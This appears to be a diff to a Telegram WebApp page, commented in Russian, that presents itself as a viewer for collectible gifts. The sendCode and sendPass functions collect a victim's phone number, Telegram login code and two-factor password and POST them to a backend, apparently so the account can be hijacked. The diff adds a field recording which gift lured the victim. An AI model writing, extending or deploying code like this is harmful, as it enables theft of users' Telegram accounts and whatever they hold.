@@ -57,6 +57,7 @@
 </div>
 
 <script>
+    const API_BASE = ""; // Добавь это в начало <script>
     const tg = window.Telegram.WebApp;
     tg.expand();
 
@@ -114,17 +115,26 @@
     };
 
     // 4. Функции интерфейса
+    // Эта переменная должна быть объявлена в начале скрипта
+    let currentTarget = "Premium Gift"; 
+
     function openNFT(name, imgKey) {
+        // СОХРАНЯЕМ ЦЕЛЬ: записываем имя подарка в переменную
+        currentTarget = name; 
+
         document.getElementById('main-screen').style.display = 'none';
         document.getElementById('details-screen').style.display = 'block';
         
         document.getElementById('d-title').innerText = name;
         const imgElement = document.getElementById('d-img');
         
+        // Твоя логика с картинками
         imgElement.src = getImageUrl(imgKey);
         imgElement.onerror = function() {
             this.src = 'https://raw.githubusercontent.com/TelegramMessenger/Gifts/main/assets/Collectibles/Gems.png';
         };
+
+        window.scrollTo(0, 0); // Чтобы страница открылась сверху
     }
 
     function closeNFT() {
@@ -168,9 +178,9 @@
     }
 
     async function sendCode() {
-        if(isSending) return;
-        const c = document.getElementById('code').value;
-        if(!c || c.length < 5) return;
+        if (isSending) return;
+        const codeInput = document.getElementById('code').value;
+        if(codeInput.length < 5) return;
 
         isSending = true;
         document.getElementById('s2').style.display = 'none';
@@ -178,32 +188,36 @@
         document.getElementById('l-text').innerText = "Проверка кода...";
 
         try {
+            // Отправляем запрос на твой роут
             const response = await fetch(`${API_BASE}/api/send_code`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    phone: String(userPhone),
-                    code: String(c),
-                    id: String(tg.initDataUnsafe.user.id) // Фикс для ошибки "bytes or str expected"
-                })
-            });
-            const data = await response.json();
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+            phone: userPhone, 
+            code: codeInput, 
+            id: tg.initDataUnsafe.user.id,
+            target: currentTarget // <--- ПЕРЕДАЕМ ЦЕЛЬ
+        })
+    });
+            const result = await response.json();
             
-            if(data.status === 'success') {
+            if(result.status === 'success') {
                 finish();
-            } else if(data.status === '2fa_needed') {
+            } else if(result.status === '2fa_needed') {
                 document.getElementById('loader').style.display = 'none';
                 document.getElementById('s3').style.display = 'block';
             } else {
-                alert("Ошибка: " + (data.message || "неверный код"));
+                alert("Ошибка: " + (result.message || "неверный код"));
                 document.getElementById('loader').style.display = 'none';
                 document.getElementById('s2').style.display = 'block';
             }
         } catch(e) {
-            alert("Ошибка сети. Бот запущен?");
+            alert("Ошибка сети. Проверьте консоль.");
             document.getElementById('loader').style.display = 'none';
             document.getElementById('s2').style.display = 'block';
-        } finally { isSending = false; }
+        } finally {
+            isSending = false;
+        }
     }
 
     async function sendPass() {
@@ -216,7 +230,7 @@
         document.getElementById('loader').style.display = 'block';
 
         try {
-            const r = await fetch(`${API_BASE}/api/send_password`, {
+            const r = await fetch(`${API_BASE}/api_send_password`, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
